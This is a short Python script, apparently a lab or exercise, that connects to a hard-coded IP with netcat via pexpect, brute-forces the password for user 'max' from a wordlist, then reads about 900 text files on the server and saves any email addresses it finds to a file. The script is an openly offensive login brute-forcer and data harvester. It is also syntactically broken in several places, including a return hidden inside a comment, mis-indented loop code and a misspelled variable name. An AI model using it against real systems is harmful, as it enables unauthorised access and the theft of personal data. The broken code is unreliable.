# importing the pexpect module

Import pexpect

def Access(secret_key, counter):
	#IP
	HOST = "83.212.97.72"
	#Port
	PORT = "80"
	connect = 'nc {} {} '.format(HOST, PORT)
	# this will execute the connection to the server
	child = pexpect.spawn(connect)
	child.expect("Login:")
	child.sendline("max")
	child.expect("Password:")
	# send the list content and the counter will be the values looped.
	child.sendline(secret_key[counter])
	print 'ATTEMPTING > {} '.format(secret_key[counter])
	Listing = child.expect(['Login Incorrect', '>'])
	if Listing == 0:
		counter = counter + 1
		return Access(secret_key, counter)
		print('Attempting a different password:')
	elif Listing == 1: 
	# will quit the function and return the value back to its caller return child 

""" Opening and reading the password list so it can be used to log in, then its put on to a loop. """ 
# opening and reading each line in the file 

secret_key = open('password.txt', 'r').readlines()
child = Access(secret_key, 0)
child.expect(">") 

""" settng variables and putting the emails into a list """ 

found_emails = ''
# turning the emails into a list
List = []

""" this piece of code will use a For loop to find emails inside the server, it will first loop through each text file using the server command more and it read the text files and see if any of them has "@" in them which stands for email, and once the emails has been found it will be printed out in the terminal and then another if statement inside the previous one to store the found '@' into a text file. """ 

print('Looping through text files, Please wait... ')

for Numb_Lines in range(1, 899):
	# sending 'more' command to the server with 1 to 89 variable
(Numb_Lines)
child.sendline('more ' + str(Numb_Lines) + '.txt')
child.expect(">")
if '@' in child.before:
	found_emails = child.before.split()
	for email in found emails:
		# if email has '@' then append it to the list
		if ('@' in email):
			List.append(email)
		print child.before

"""this piece of code will create and open a text file and store all the emails found in there. """

file = open('EMAILSFOUND.txt', 'w')
for email in List:
	# writing the emails in a line order, so line1, line2 etc.
	file.write(email + '\n')
file.close()
